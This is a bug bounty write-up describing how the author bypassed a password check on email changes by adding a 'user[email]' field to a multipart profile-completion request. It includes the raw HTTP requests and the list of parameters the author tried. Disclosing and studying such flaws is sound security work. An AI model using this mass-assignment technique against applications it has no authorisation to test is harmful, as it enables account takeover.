---
layout: post
title: Bypassing Email change verifications
subtitle: 
tags: [write-up, incorrect authorization, low, takeaways, 250$]
comments: false
---

### Background

Many companies require you to enter your password to update your email. This is because if an account is compromised by cookie theft (XSS for instance), a determined attacker still needs to update the email address to reset the password and achieve a permanent account takeover.

Besides, it is a good practice to send a verification link to the new email to make sure that a user doesn't update his email address to an address he doesn't own, pretending to be someone else.

This program had the described above protections in place.

Changing email address requires a password:

```shell
PUT /users/1337/update_email HTTP/1.1
Host: app.redacted.com

{
    "current_password":"guessing",
    "email":"attacker@gmail.com"
}
```

### Description

I noticed while setting up my account that a "Complete your profile" step was sending a strange request:

```
POST /complete_profile HTTP/1.1
Host: app.redacted.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy4NAam5eM2a0BFbF

------WebKitFormBoundaryy4NAam5eM2a0BFbF
Content-Disposition: form-data; name="utf8"
✓

------WebKitFormBoundaryy4NAam5eM2a0BFbF
Content-Disposition: form-data; name="user[title]"

CEO
------WebKitFormBoundaryy4NAam5eM2a0BFbF
Content-Disposition: form-data; name="user[phone]"

------WebKitFormBoundaryy4NAam5eM2a0BFbF--
```

The application usually operates standard CRUD operations with REST API but here, the request is using `Content-Type: multipart/form-data`. Another thing to notice here is that the path does not respect REST API. **As a bug hunter, this should be a hint that something might be vulnerable.**

Here are different things I tried:
  - Add `user[is_admin]` to achieve privilege escalation => Failed
  - Add `user[user_id]` of another account to the request to achieve an IDOR => Failed
  - Add `user[password]` to update password without knowing existing password => Failed

And finally:
  - Add `user[email]` to update email without knowing existing password => Success

```
POST /complete_profile HTTP/1.1
Host: app.redacted.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy4NAam5eM2a0BFbF

------WebKitFormBoundaryy4NAam5eM2a0BFbF
Content-Disposition: form-data; name="utf8"
✓

------WebKitFormBoundaryy4NAam5eM2a0BFbF
Content-Disposition: form-data; name="user[title]"

CEO
------WebKitFormBoundaryy4NAam5eM2a0BFbF
Content-Disposition: form-data; name="user[phone]"

------WebKitFormBoundaryy4NAam5eM2a0BFbF
Content-Disposition: form-data; name="user[email]"

attacker@gmail.com
------WebKitFormBoundaryy4NAam5eM2a0BFbF--
```

### Takeaways

 - Don't rush into the signup process. Take a close look at every request using Burp.

    I usually Intercept everything in Burp during signup. It can take me up to 15 minutes only to complete this step but I truly believe this is time well invested if I plan to stick with the program. I use this as an opportunity to gather information about the technologies used by the application.

    Internally, different teams are often responsible for the core application and signup/growth/user conversion. This means different code paths could be used in the backend resulting in bypassing usual protections. Add to that communication issues between teams and you have the perfect cocktail for vulnerabilities to raise.

 - Learn what is important for the company
    
    In this particular case, because there are measures in place to prevent updating emails without the password I decided to report. I later found a way to update the email address only once during signup, allowing someone to pretend to be someone else. This time I decided not to report as I know that it would not be of any interest and could be chained with another bug to increase its impact.


### Summary

 - **Weakness**: Incorrect Authorization
 - **Reward**: 250$